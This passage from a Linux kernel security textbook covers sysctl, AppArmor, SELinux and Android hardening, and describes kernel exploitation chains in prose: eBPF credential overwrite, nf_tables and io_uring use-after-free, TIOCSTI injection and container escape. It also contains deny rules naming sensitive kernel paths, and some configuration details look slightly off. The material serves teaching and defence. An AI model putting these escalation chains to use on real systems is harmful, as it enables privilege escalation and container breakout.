**Android io_uring restrictions.** Android disabled io_uring by default starting with Android 14 (kernel 6.1-based GKI). The Generic Kernel Image (GKI) configuration sets `CONFIG_IO_URING=n` at compile time, eliminating the syscall entry point entirely. This is the most thorough hardening — compile-time removal cannot be bypassed by any runtime configuration change.

### 20.4 Sysctl Hardening Matrix

The following matrix consolidates security-relevant sysctl parameters across all kernel subsystems discussed in this chapter. Each parameter includes the recommended value, the attack surface it mitigates, and the performance or functionality impact of setting it.

```bash
## =============================================================
## Comprehensive sysctl hardening for kernel subsystems
## Deploy to: /etc/sysctl.d/99-kernel-hardening.conf
## Apply:     sysctl --system
## =============================================================

## --- Process and memory protection ---
kernel.yama.ptrace_scope = 3
# Values: 0=classic (any process can ptrace), 1=parent only,
#         2=admin only (CAP_SYS_PTRACE), 3=no ptrace at all
# Impact: breaks debuggers (gdb, strace) for non-root users

kernel.dmesg_restrict = 1
# Restrict dmesg to CAP_SYSLOG. Prevents KASLR leak via dmesg.
# Impact: non-root users cannot read kernel ring buffer

kernel.kptr_restrict = 2
# Value 0: kernel pointers visible, 1: hidden from non-CAP_SYSLOG,
# 2: hidden from all (including root — use /proc/kallsyms with debug tools)
# Impact: /proc/kallsyms shows 0x0000000000000000 for all symbols

kernel.perf_event_paranoid = 3
# Value 3: disallow all perf events for non-root
# Impact: performance profiling requires root or CAP_PERFMON

kernel.kexec_load_disabled = 1
# Prevent loading a new kernel via kexec. One-way toggle.
# Impact: kexec-based fast reboot unavailable

kernel.sysrq = 0
# Disable magic SysRq key (or set to 176 for safe subset)
# Impact: cannot use SysRq for emergency debugging

## --- eBPF hardening ---
kernel.unprivileged_bpf_disabled = 2
# Permanently disable unprivileged BPF (see §20.2)
# Impact: monitoring tools need CAP_BPF

net.core.bpf_jit_harden = 2
# JIT constant blinding for all users
# Impact: ~5-10% BPF program execution overhead

## --- io_uring ---
io_uring_disabled = 2
# Disable io_uring entirely (see §20.3)
# Impact: applications using io_uring fail; use value 1 to allow root only

## --- Filesystem protection ---
fs.protected_symlinks = 1
# Prevent following symlinks in world-writable sticky directories
# unless the symlink owner matches the follower or directory owner
# Impact: none for well-written applications

fs.protected_hardlinks = 1
# Prevent creating hardlinks to files the user doesn't own
# Impact: none for standard use cases

fs.protected_fifos = 2
# Prevent opening FIFOs in world-writable sticky directories
# unless FIFO owner matches opener
# Impact: rare edge cases with legacy named pipes

fs.protected_regular = 2
# Prevent creating regular files via open(O_CREAT) in sticky directories
# that the user doesn't own
# Impact: rare edge cases with legacy /tmp usage patterns

fs.suid_dumpable = 0
# Prevent core dumps from SUID processes
# Impact: cannot debug SUID binary crashes

## --- Network hardening ---
net.ipv4.conf.all.rp_filter = 1
# Strict reverse-path filtering (drop packets with unreachable source)
# Impact: breaks asymmetric routing if present

net.ipv4.conf.default.rp_filter = 1
net.ipv4.conf.all.accept_redirects = 0
net.ipv4.conf.default.accept_redirects = 0
net.ipv6.conf.all.accept_redirects = 0
net.ipv6.conf.default.accept_redirects = 0

net.ipv4.conf.all.send_redirects = 0
net.ipv4.conf.default.send_redirects = 0

net.ipv4.conf.all.accept_source_route = 0
net.ipv6.conf.all.accept_source_route = 0

net.ipv4.icmp_echo_ignore_broadcasts = 1
net.ipv4.tcp_syncookies = 1

## --- Namespace restriction ---
user.max_user_namespaces = 0
# Disable user namespace creation entirely
# Impact: breaks unprivileged containers, Flatpak, Chrome sandbox
# Use with caution — set to a reasonable limit instead for desktops:
# user.max_user_namespaces = 10

## --- TTY hardening ---
dev.tty.legacy_tiocsti = 0
# Disable TIOCSTI ioctl (Linux 6.2+)
# Impact: breaks ancient terminal automation relying on TIOCSTI
```

Verification script to confirm hardening is applied:

```bash
#!/bin/bash
# verify-hardening.sh — check sysctl hardening values
declare -A EXPECTED=(
  ["kernel.yama.ptrace_scope"]=3
  ["kernel.dmesg_restrict"]=1
  ["kernel.kptr_restrict"]=2
  ["kernel.unprivileged_bpf_disabled"]=2
  ["net.core.bpf_jit_harden"]=2
  ["fs.protected_symlinks"]=1
  ["fs.protected_hardlinks"]=1
  ["fs.suid_dumpable"]=0
  ["net.ipv4.conf.all.rp_filter"]=1
)

FAILED=0
for key in "${!EXPECTED[@]}"; do
  actual=$(sysctl -n "$key" 2>/dev/null)
  if [ "$actual" != "${EXPECTED[$key]}" ]; then
    echo "FAIL: $key = $actual (expected ${EXPECTED[$key]})"
    FAILED=$((FAILED + 1))
  fi
done

if [ $FAILED -eq 0 ]; then
  echo "All hardening sysctls verified."
else
  echo "$FAILED sysctls not at expected values."
  exit 1
fi
```

### 20.5 LSM Stacking and Configuration

Defense in depth for kernel subsystem protection stacks multiple LSMs, each covering a different aspect of the threat model. The recommended stack for production systems combines capability restrictions, mandatory access control (AppArmor or SELinux), Landlock for application-level sandboxing, Yama for ptrace restriction, and BPF LSM for programmatic policy.

**AppArmor profiles for container workloads.** AppArmor profiles confine container processes to a declared set of filesystem paths, capabilities, and network operations. The default Docker AppArmor profile (`docker-default`) provides a baseline, but production workloads benefit from custom profiles that restrict access to the specific paths and capabilities the application requires.

```
# /etc/apparmor.d/containers/webapp-profile
#include <tunables/global>

profile webapp-container flags=(attach_disconnected,mediate_deleted) {
    #include <abstractions/base>
    #include <abstractions/nameservice>

    # Application binary and libraries
    /usr/bin/node ix,
    /usr/lib/node_modules/** r,
    /app/** r,
    /app/node_modules/.cache/** rw,

    # Allowed temporary file operations
    /tmp/app-* rw,
    owner /tmp/** rw,

    # Network: allow TCP server and client
    network inet stream,
    network inet6 stream,
    network inet dgram,
    network inet6 dgram,

    # Deny dangerous paths
    deny /proc/sys/** w,
    deny /proc/sysrq-trigger w,
    deny /proc/*/mem rw,
    deny /sys/** w,
    deny /dev/mem rw,
    deny /dev/kmem rw,

    # Deny mount operations
    deny mount,
    deny umount,
    deny pivot_root,

    # Allowed capabilities (minimal set)
    capability net_bind_service,
    capability setuid,
    capability setgid,

    # Deny dangerous capabilities
    deny capability sys_admin,
    deny capability sys_ptrace,
    deny capability sys_module,
    deny capability sys_rawio,
}
```

**SELinux policy for kernel subsystem restriction.** SELinux provides finer-grained control through type enforcement. For restricting kernel subsystem access, SELinux policy rules deny specific subsystem interactions to confined domains.

```bash
# Create a custom SELinux module restricting container access to
# kernel subsystems

cat > container_hardening.te << 'POLICY'
module container_hardening 1.0;

require {
    type container_t;
    type kernel_t;
    type proc_kcore_t;
    type sysctl_kernel_t;
    type debugfs_t;
    class capability sys_admin;
    class capability2 bpf;
    class bpf { map_create prog_load prog_run };
    class io_uring { setup enter register };
}

# Deny BPF operations from containers
neverallow container_t self:capability2 bpf;
neverallow container_t self:bpf { map_create prog_load prog_run };

# Deny io_uring operations from containers
neverallow container_t self:io_uring { setup enter register };

# Deny access to kernel memory
neverallow container_t proc_kcore_t:file { read write };
neverallow container_t debugfs_t:file { read write };

# Deny write to kernel sysctls
neverallow container_t sysctl_kernel_t:file write;
POLICY

# Compile and install
checkmodule -M -m -o container_hardening.mod container_hardening.te
semodule_package -o container_hardening.pp -m container_hardening.mod
semodule -i container_hardening.pp
```

**Landlock filesystem sandboxing (Linux 5.13+).** Landlock complements LSMs like AppArmor and SELinux by allowing applications to sandbox themselves without requiring system-wide policy changes. Applications call `landlock_create_ruleset`, add filesystem access rules, and then restrict themselves. The sandbox is inherited by child processes and cannot be relaxed. Landlock is stackable — restrictions from Landlock, AppArmor, and SELinux all apply simultaneously (most restrictive wins).

**LSM BPF (Linux 6.7+).** BPF LSM allows writing LSM hooks as eBPF programs, loaded at runtime without recompiling the kernel or writing traditional LSM policy. BPF LSM programs attach to specific LSM hook points (`security_file_open`, `security_bpf`, `security_socket_connect`) and return allow/deny decisions. This enables dynamic security policy that can adapt to workload behavior, correlate multiple hook invocations, and maintain state across calls via BPF maps. Tetragon's enforcement policies (§18.4) use BPF LSM under the hood for their `Sigkill` actions.

### 20.6 Android Kernel Hardening

Android's kernel hardening diverges from server Linux in several areas due to the mobile threat model (untrusted app installation, physical attacker access, baseband/GPU vendor blob exposure).

**SELinux policy on Android.** Android enforces SELinux in enforcing mode with no permissive exceptions in production builds. The `neverallow` rules in the Android Compatibility Definition Document (CDD) prevent OEMs from loosening critical policy. Key neverallow rules include: no untrusted app may transition to a privileged domain, no process in the app domain may load kernel modules, no process may write to `/proc/sys/kernel/` entries except the init process. Vendor sepolicy (under `/vendor/etc/selinux/`) is compiled separately from the platform sepolicy and is subject to the platform's neverallow constraints — a vendor cannot grant their proprietary daemon access to system-level types without the neverallow check rejecting the policy at build time.

**Seccomp on Android.** Android applies seccomp filters at the zygote level — every app process inherits the zygote's seccomp filter because all apps are forked from zygote. The Bionic libc integrates seccomp filter loading, and the filter is architecture-aware (ARM64 + ARM32 compat). The Android seccomp policy blocks approximately 100 syscalls including `kexec_load`, `init_module`, `finit_module`, `delete_module`, `mount`, `umount2`, `pivot_root`, `swapon`, `swapoff`, `reboot`, `settimeofday`, `clock_settime`, `acct`, `syslog`, and the entire io_uring family. The allowlist is maintained in AOSP under `bionic/libc/SECCOMP_ALLOWLIST_*.txt`.

**Generic Kernel Image (GKI).** Starting with Android 12, Google mandates GKI for all new Android devices. GKI provides a standardized kernel binary compiled by Google with a defined set of security configurations. The security implications include: consistent sysctl defaults across devices (no vendor weakening), consistent LSM stack (`selinux,lockdown,capability`), compile-time removal of dangerous subsystems (`CONFIG_IO_URING=n` since Android 14), and a stable kernel module ABI that restricts what vendor modules can access. GKI does not prevent vendor module vulnerabilities, but it eliminates kernel-core variation as a vulnerability source and ensures security patches apply uniformly across the device ecosystem.

---

## 21. Advanced Exploitation Techniques and Research

Kernel exploitation has evolved from single-vulnerability, single-subsystem exploits to multi-stage chains that combine vulnerabilities or primitives across subsystems. Modern kernel mitigations — KASLR, SMEP/SMAP, KPTI, KCFI, slab randomization — require increasingly sophisticated techniques to defeat. This section examines cross-subsystem exploitation chains, namespace-based attack combinations, race condition exploitation patterns, and emerging attack surfaces that are the subject of active research.

### 21.1 Cross-Subsystem Exploitation Chains

Single-subsystem exploits are often insufficient on modern hardened kernels because the initial vulnerability provides only a limited primitive (a partial overwrite, a small out-of-bounds read, or a constrained UAF). Attackers chain primitives from different subsystems to escalate from the initial primitive to full kernel read/write and ultimately to credential overwrite.

**io_uring + msg_msg combined exploitation.** The io_uring subsystem provides a controlled UAF through reference counting bugs in `io_kiocb` lifecycle management (§9.2). The freed `io_kiocb` object (or its associated buffers) occupies a specific `kmalloc-*` cache. The attacker then sprays `msg_msg` objects (§11.2) of the same size class to reclaim the freed memory. Because `msg_msg` content is partially user-controlled (the message body), the attacker gains read/write over the freed io_uring object's fields. The key insight is that `msg_msg` provides the controllable content, while io_uring provides the dangling reference — combining them converts a UAF into an arbitrary read/write primitive. The read primitive comes from using `MSG_COPY` (if available) to read the sprayed object contents through the io_uring reference, and the write primitive comes from writing through the dangling io_uring pointer into what is now the `msg_msg` header containing linked-list pointers.

**eBPF verifier bug to arbitrary kernel read/write to credential overwrite.** This chain is the canonical eBPF privilege escalation flow (§7.3), but the modern variant accounts for mitigations that the simple description omits. On kernels with `CONFIG_BPF_UNPRIV_DEFAULT_OFF=y`, the attacker first needs to find a way to load BPF programs — either through a separate vulnerability that grants `CAP_BPF`, through a process that already holds `CAP_BPF` (monitoring agents, container runtimes), or through a kernel version where the sysctl is not set. Once BPF program loading is achieved, the verifier bypass produces a BPF program that can read arbitrary kernel memory. The attacker reads `current_task` (via the `bpf_get_current_task()` helper or by reading the per-CPU `current` pointer), walks `task_struct` → `cred`, reads the current credential values (to verify the correct offset — KASLR does not affect structure field offsets, but kernel version differences change `cred` layout), and then writes uid=0, gid=0, and `cap_effective = CAP_FULL_SET` into the `cred` structure. On kernels with `CONFIG_BPF_LSM=y`, the BPF LSM hook on `security_cred_free` or `security_task_fix_setuid` may detect the modification — this is a defense-in-depth layer against the exact attack the eBPF exploit performs.

**Netfilter UAF to controlled object reuse to privilege escalation.** The nf_tables exploitation pattern (§8.2) starts with a UAF produced by race conditions in batch processing of netlink messages. The freed object is an nf_tables internal structure (set element, verdict, or chain object) in a specific slab cache. The attacker replaces the freed object with a controlled allocation — common choices include `msg_msg` (flexible size, partially user-controlled), `add_key` (keyring payload, fully user-controlled content), or `setxattr` (temporary kernel allocation with fully user-controlled content and size). The replacement object overwrites the freed nf_tables object's function pointers or linked-list pointers. When nf_tables dereferences the now-attacker-controlled pointer, execution is redirected. On KCFI-enabled kernels, the redirected function pointer must match a valid CFI type hash, which restricts the set of gadgets to functions with the expected signature — but does not prevent exploitation entirely, as the attacker can call any function with the matching signature, including `commit_creds` if its type hash matches.

**TTY pushback combined with seccomp bypass.** TIOCSTI injection (§6) pushes characters into a terminal's input queue, causing the terminal's foreground process to read attacker-supplied input as if the user typed it. If the attacker has code execution inside a seccomp sandbox that prevents `execve` but allows `ioctl`, they can use TIOCSTI to inject commands into a shell session on the same terminal. The injected commands execute outside the sandbox — in the shell process's security context. This technique requires the attacker's process to have a file descriptor to the target terminal (typically inherited from the parent process). The defense is the `dev.tty.legacy_tiocsti=0` sysctl (Linux 6.2+), which disables TIOCSTI entirely.

### 21.2 Namespace and Cgroup Exploitation Combinations

Linux namespaces provide the isolation foundation for containers, but the boundaries between namespaces are enforced by kernel code. Exploiting the interactions between different namespace types produces container escapes that do not require a kernel vulnerability — only misconfigurations or design limitations.

**User namespace to mount namespace to overlayfs.** This chain works on kernels where user namespace creation is permitted (`user.max_user_namespaces > 0`). The attacker creates a user namespace (gaining `CAP_SYS_ADMIN` within it), creates a mount namespace (allowed with `CAP_SYS_ADMIN` in the user namespace), and mounts an overlayfs within the mount namespace. Overlayfs vulnerabilities (§10.3, CVE-2021-3493, CVE-2023-0386) that involve incorrect capability checks in the user namespace or SUID handling during copy-up become exploitable because the attacker has the prerequisite capabilities within the user namespace. The exploitation escapes back to the initial namespace by leveraging the privilege gained through the overlayfs bug — for example, creating a SUID binary in the overlay that is effective when accessed from the initial namespace.

**Cgroup release_agent with PID namespace confusion.** The cgroup release_agent escape (§13.2) executes a binary when the last process in a cgroup exits. In a multi-namespace environment, the `release_agent` path is resolved in the host's mount namespace, but the process that triggers the release (by being the last to exit the cgroup) exists in the container's PID namespace. If the attacker can manipulate the host's view of the cgroup membership — for example, by exploiting a race between PID namespace teardown and cgroup accounting — they can trigger the release agent execution while the host believes the cgroup is empty, but the container process is still running and able to interact with the release agent's effects.

**Network namespace escape via veth pair manipulation.** Container networking typically uses veth (virtual Ethernet) pairs: one end in the container's network namespace, the other in the host's (or a bridge namespace). If the attacker can access both ends of a veth pair (through a kernel bug or misconfiguration that allows `setns` into the host network namespace), they gain access to the host network stack. This enables traffic injection, ARP spoofing, and access to services bound to localhost on the host. The prerequisite is either a kernel vulnerability in network namespace isolation or possession of `CAP_NET_ADMIN` in a namespace that shares the host's network namespace (which happens when `--net=host` is used in Docker).

### 21.3 Race Condition Exploitation Patterns

Race conditions are the most common vulnerability class in kernel subsystems because the kernel is inherently concurrent — multiple CPUs execute kernel code simultaneously, interrupted by hardware interrupts, software interrupts, and preemption. Exploiting race conditions reliably requires techniques to widen the race window and control the timing of concurrent operations.

**TOCTOU in filesystem operations.** Time-of-check-to-time-of-use races in path resolution are a classic attack class. The kernel resolves a pathname (check), then the attacker replaces the file with a symlink pointing elsewhere (between check and use), and the kernel operates on the wrong file (use). Specific instances include: symlink races in `/tmp` (the kernel opens a file in `/tmp` after checking it is safe, but the attacker replaces it with a symlink to `/etc/shadow`), rename races (the attacker renames a directory component between path lookup stages), and mount point races (the attacker mounts a different filesystem at a path component between lookup and operation).

The kernel mitigates many filesystem TOCTOU races with `O_NOFOLLOW`, `openat2(RESOLVE_NO_SYMLINKS)` (Linux 5.6+), and `fs.protected_symlinks=1`. However, these mitigations protect against specific patterns, not the general TOCTOU class.

**Race-window widening techniques.** Reliable exploitation of narrow race windows requires techniques that suspend one of the racing threads at a controlled point.

The userfaultfd technique registers a userfaultfd handler on a memory region. When the kernel accesses that region (e.g., during `copy_from_user`), the kernel thread faults and blocks until the userfaultfd handler provides the page. The attacker's handler delays the response, holding the kernel thread in the race window while the second thread performs the racing operation. Userfaultfd has been restricted since Linux 5.11 (`vm.unprivileged_userfaultfd=0`), and since Linux 6.1, unprivileged userfaultfd is fully disabled by default.

The FUSE technique (§10.4) achieves the same effect: the attacker creates a FUSE filesystem where a read or getattr handler blocks indefinitely. When the kernel accesses a file on this FUSE filesystem, the kernel thread blocks in the FUSE request queue, holding the race window open. FUSE-based pausing requires `CAP_SYS_ADMIN` to mount (or a user namespace + mount namespace combination, which loops back to namespace exploitation).

The futex technique uses futex contention to control thread scheduling. By creating controlled lock contention, the attacker influences which thread runs and when, narrowing the timing uncertainty. This technique does not require any special capabilities but provides less precise control than userfaultfd or FUSE.

### 21.4 Emerging Attack Surfaces

Kernel development continuously introduces new subsystems and features that expand the attack surface. The following areas are subjects of active security research with ongoing vulnerability discovery.

**Rust-in-kernel modules.** Linux 6.1 introduced initial Rust language support for kernel modules. Rust's memory safety guarantees (ownership, borrowing, lifetimes) eliminate the UAF, double-free, and buffer overflow classes that constitute the majority of kernel vulnerabilities. However, Rust kernel modules interact with C kernel code through `unsafe` FFI boundaries, and these boundaries are where new vulnerability classes may emerge: incorrect lifetime annotations on kernel objects passed across the FFI boundary, data races when Rust code and C code concurrently access shared structures (Rust's Send/Sync traits must be correctly implemented for kernel types), and panic-in-kernel behavior (Rust panics in kernel context trigger kernel BUG(), which may leave kernel state inconsistent). The security research question is whether Rust kernel modules introduce new bug classes at the FFI boundary that are different from and potentially more subtle than the C memory safety bugs they replace.

**FUSE as an exploitation primitive.** Beyond the FUSE-pause technique (§10.4), FUSE is an increasingly important exploitation primitive because user namespace + mount namespace gives unprivileged users the ability to mount FUSE filesystems. This means any kernel code path that accesses the filesystem (path lookup, stat, read, readdir) can be paused by an unprivileged attacker. Research is exploring FUSE-based attacks against: the VFS dentry cache (stalling path lookups to create dangling dentry references), kernel file-read operations in module loading (the kernel reads from a FUSE filesystem when loading a module specified in `/proc/sys/kernel/modprobe`), and core dump handling (the kernel writes to the core pattern path, which can be on a FUSE filesystem that stalls the write).

**vsock (Virtual Machine Sockets) exploitation.** vsock (`AF_VSOCK`) provides communication between VMs and the host without IP networking. The vsock driver in the host kernel handles connections from all VMs, making it a cross-VM attack surface. Vulnerabilities in the host-side vsock implementation (buffer management, connection lifecycle, memory mapping) could allow a compromised VM to attack the hypervisor or other VMs. Research has identified reference counting bugs and buffer overflow conditions in the VMCI and vhost-vsock implementations. As vsock adoption increases (Firecracker, QEMU, cloud functions), the attack surface grows.

**Landlock bypass research.** Landlock (§14.3) is a relatively new LSM, and research is examining whether its filesystem access model can be bypassed. Potential bypass vectors include: symlink resolution across Landlock boundaries (accessing a restricted file through a symlink in an allowed directory), race conditions between Landlock rule installation and filesystem operations, and interactions between Landlock and other filesystem features (overlayfs, bind mounts, procfs). The Landlock developers maintain an active test suite that covers these interactions, and the subsystem has been relatively free of bypasses, but its novelty means the attack surface has received less scrutiny than SELinux or AppArmor.

**eBPF type confusion via BTF manipulation.** BPF Type Format (BTF) provides type information for BPF programs, enabling the verifier to understand the layout of kernel data structures. Manipulation of BTF metadata — providing incorrect type descriptions to the verifier — is an emerging research area. If the verifier trusts BTF metadata that misrepresents a structure's layout, it may allow memory accesses that violate the actual structure boundaries. The kernel validates BTF metadata in `btf_verify_sec_info()`, but the complexity of type representation creates opportunities for validation gaps. This attack vector is orthogonal to the traditional verifier bounds-tracking bugs (§7.2) and represents a second front in eBPF security research.

---

## 22. Cross-References

**To Chapter 5A:** SLUB allocator internals explain why spray techniques work. The UAF exploitation flow is the general case for subsystem-specific targets (file, tty, io_uring). Hardware mitigations (SMEP, SMAP, KPTI, KASLR, KCFI) constrain payloads after vtable hijacking. `commit_creds` is the typical endgame after kernel code execution.

**To Domain 2:** Seccomp (Chapter 2B §3) defines the filter model constraining exploitation in §17. `io_uring` (Chapter 2B §4) is the syscall interface behind §9. User namespaces (Chapter 2C §3.4) provide the `CAP_NET_ADMIN` making nf_tables exploitation reachable. The capability model (Chapter 2C §1) determines what each exploitation target achieves.

**To Domain 4 (code reuse):** Kernel vtable hijacking (§1, §6) is the kernel analogue of C++ vtable attacks (Domain 4 §5 COOP). Kernel CFI (Chapter 5A §7.6) applies Clang CFI to kernel indirect calls.

**To the attack taxonomy:** Real-world kernel exploits chain: initial vulnerability (UAF, race, verifier bypass) → corruption primitive → heap spray → vtable hijack → code execution → `commit_creds`. Defender's mitigation stack: restrict triggering interface (seccomp, capability dropping, disable io_uring/BPF), harden allocator (freelist randomization, init-on-free), enable kernel CFI, enable hardware mitigations (SMEP/SMAP/KPTI), monitor post-exploitation indicators (credential changes, suspicious syscall patterns).

---

## Exercises

**Exercise 1 — Seccomp Filter with Architecture Validation.**
Write a seccomp-BPF filter in raw cBPF (not libseccomp) that: (a) validates `seccomp_data.arch == AUDIT_ARCH_X86_64` and kills the process on mismatch, (b) blocks `execve` (59), `execveat` (322), and `mprotect` with `PROT_EXEC` (argument filtering on `args[2]`), (c) allows all other syscalls. Install it via `prctl(PR_SET_SECCOMP)`. Test by attempting `execve("/bin/sh")` — verify the process is killed. Then test the architecture confusion bypass by invoking `int 0x80` with `eax=11` — verify it is also killed. Tools: GCC, strace, seccomp test harness. Reference: §2.5, §3.1, `tutorials/tutorial_domain5_ch5B_subsystem_lab.md`.

**Exercise 2 — io_uring Seccomp Bypass Demonstration.**
On a kernel with `io_uring_disabled=0`, write a program that: (a) installs a seccomp filter blocking `openat` and `read`, (b) uses `io_uring` to submit `IORING_OP_OPENAT` and `IORING_OP_READ` operations through the submission queue, (c) demonstrates that the operations succeed despite the seccomp filter. Then verify that blocking `io_uring_setup` (425) in the seccomp filter prevents the bypass. Document the kernel version boundary where io_uring operations began triggering seccomp checks. Tools: liburing, seccomp, strace. Reference: §3.4, §9.

**Exercise 3 — eBPF Verifier Bounds Tracking Exploration.**
Write an eBPF program (type `BPF_PROG_TYPE_SOCKET_FILTER`) that attempts an out-of-bounds map access via ALU operations that confuse the verifier's bounds tracking. Use `bpftool` to load the program and observe the verifier rejection message. Then modify the program to stay within bounds and successfully load. Document the verifier's rejection reasoning and identify which check caught the violation. Requires `CAP_BPF`. Tools: bpftool, libbpf, clang with BPF target. Reference: §7.1-§7.3.

**Exercise 4 — Container Escape via Cgroup release_agent.**
In a Docker container launched with `--privileged` (which grants `CAP_SYS_ADMIN`), execute the cgroup v1 release_agent escape (§13.2). Verify that a file is written on the host filesystem. Then demonstrate that removing `--privileged` (using default capabilities) prevents the escape. Finally, show that switching to cgroup v2 (`--cgroupns=private` with cgroup v2 host) eliminates the `release_agent` vector entirely. Tools: Docker, `mount`, `echo`. Reference: §13.2.

**Exercise 5 — Multi-Layer Detection Deployment.**
Deploy the following detection stack on a test system: (a) auditd rules from §10F.4 (kallsyms read, slab recon, io_uring setup), (b) Falco rules from §10F.3 (userfaultfd creation, mass IPC spray, module from writable path), (c) Sigma rules from §18.1 (seccomp violation burst, eBPF load by non-root, nf_tables manipulation). Execute a simulated attack sequence that triggers at least one rule from each layer. Measure detection latency (time from attack action to alert) for each layer. Tools: auditd, Falco, Sigma-compatible SIEM, custom trigger scripts. Reference: §18.1, `tutorials/tutorial_domain5_ch5B_subsystem_lab.md`.

---

## Readings and References

- ARMO Security — io_uring Rootkit Bypasses Linux Security Tools. https://www.armosec.io/blog/io_uring-rootkit-bypasses-linux-security/ (retrieved: 2026-05-29)
- Upwind — io_uring: Linux Performance Boost or Security Headache? https://www.upwind.io/feed/io_uring-linux-performance-boost-or-security-headache (retrieved: 2026-05-29)
- Linux Security Advisory — eBPF Abuse: Linux Kernel Visibility Gap (2025). https://linuxsecurity.com/features/ebpf-abuse-linux-kernel-visibility-gap (retrieved: 2026-05-29)
- eunomia — eBPF Ecosystem Progress in 2024-2025: A Technical Deep Dive. https://eunomia.dev/blog/2025/02/12/ebpf-ecosystem-progress-in-20242025-a-technical-deep-dive/ (retrieved: 2026-05-29)
- He, W. "RingGuard: Guard io_uring with eBPF." ACM CCS Workshop 2023. https://dl.acm.org/doi/pdf/10.1145/3609021.3609304 (retrieved: 2026-05-29)
- CVE-2024-1086 — nf_tables double-free, actively exploited. https://nvd.nist.gov/vuln/detail/CVE-2024-1086 (retrieved: 2026-05-29)
- CVE-2023-32233 — nf_tables anonymous set UAF. https://nvd.nist.gov/vuln/detail/CVE-2023-32233 (retrieved: 2026-05-29)
- CVE-2021-3490 — eBPF verifier ALU32 bounds bypass. https://nvd.nist.gov/vuln/detail/CVE-2021-3490 (retrieved: 2026-05-29)
- MITRE ATT&CK T1068 — Exploitation for Privilege Escalation. https://attack.mitre.org/techniques/T1068/ (retrieved: 2026-05-29)
- MITRE ATT&CK T1611 — Escape to Host. https://attack.mitre.org/techniques/T1611/ (retrieved: 2026-05-29)
- MITRE ATT&CK T1059 — Command and Scripting Interpreter. https://attack.mitre.org/techniques/T1059/ (retrieved: 2026-05-29)
- MITRE ATT&CK T1547.006 — Kernel Modules and Extensions. https://attack.mitre.org/techniques/T1547/006/ (retrieved: 2026-05-29)
- libseccomp documentation. https://github.com/seccomp/libseccomp (retrieved: 2026-05-29)
- Docker default seccomp profile source. https://github.com/moby/moby/blob/master/profiles/seccomp/default.json (retrieved: 2026-05-29)
- Falco — Cloud Native Runtime Security. https://falco.org/docs/ (retrieved: 2026-05-29)
- Tetragon — eBPF-based Security Observability and Runtime Enforcement. https://tetragon.io/docs/ (retrieved: 2026-05-29)

---

## Cross-References

| Document | Section | Relationship |
|----------|---------|--------------|
| `domain5_chapter5A_kernel_exploitation.md` | §1-§10 SLUB, UAF, ROP, mitigations | General kernel exploitation framework; subsystem targets here build on the UAF/spray/ROP primitives |
| `domain2_chapter2B_syscall_seccomp_ptrace.md` | §3 Seccomp filter model | Foundational seccomp mechanism; this chapter extends with bypass techniques and container integration |
| `domain2_chapter2C_caps_ns_lsm.md` | §1 Capabilities, §3 Namespaces, §4 LSMs | Capability model determines exploitation reach; namespace exploitation enables nf_tables access |
| `domain4_chapter4B_cfi_hardware_bypass.md` | §9 Clang CFI, §1.4 Kernel IBT | Kernel CFI constrains vtable hijack payloads after the subsystem UAF is achieved |
| `domain31_chapter31B_runtime_security_zero_trust.md` | §1 eBPF runtime security | Falco/Tetragon detection rules here integrate with the runtime security architecture there |
| `tutorials/tutorial_domain5_ch5B_subsystem_lab.md` | Full lab | Hands-on seccomp filter writing, io_uring bypass, and cgroup escape exercises |

---

## Glossary

| Term | Definition |
|------|------------|
| **seccomp** | Secure Computing Mode — Linux kernel facility restricting a process's available syscalls via strict mode or BPF filter programs. |
| **cBPF (classic BPF)** | The BPF instruction set used by seccomp filters, operating on `struct seccomp_data` with 32-bit registers and conditional jumps. |
| **SECCOMP_RET_KILL_PROCESS** | Seccomp return action that terminates the entire process upon a policy-violating syscall. |
| **io_uring** | Linux asynchronous I/O interface using shared-memory submission/completion rings, capable of performing operations without per-operation syscalls. |
| **eBPF verifier** | Static analyzer in the Linux kernel that validates every BPF program before loading to ensure memory safety and termination. |
| **nf_tables** | The kernel's netfilter subsystem for packet filtering and NAT, managed via netlink; a recurring source of privilege escalation CVEs. |
| **userfaultfd** | Linux syscall enabling user-space page-fault handling; exploited to widen kernel race windows by pausing copy_from_user operations. |
| **release_agent** | Cgroup v1 feature that executes a specified binary when the last process in a cgroup exits; abused for container escapes. |
| **SCM_RIGHTS** | Unix socket ancillary data type for passing file descriptors between processes; enables privilege delegation and confused-deputy attacks. |
| **Landlock** | Programmatic sandboxing LSM (Linux 5.13+) allowing unprivileged processes to restrict their own filesystem and network access. |
| **Binder** | Android's IPC mechanism implementing transactional inter-process communication with reference counting and shared memory. |
| **FUSE** | Filesystem in Userspace — framework allowing user-space programs to implement filesystems; exploited as a kernel-thread pausing primitive for race conditions. |
| **tty_struct** | Kernel structure representing a terminal device; contains the `tty_operations` vtable with ~25 function pointers, exploitable via heap spray and UAF. |
| **CONFIG_KCOV** | Kernel compile-time option enabling code-coverage instrumentation for coverage-guided fuzzing with syzkaller. |
| **architecture confusion** | Seccomp bypass where the attacker invokes 32-bit syscalls (via `int 0x80`) to evade filters that only check 64-bit syscall numbers. |
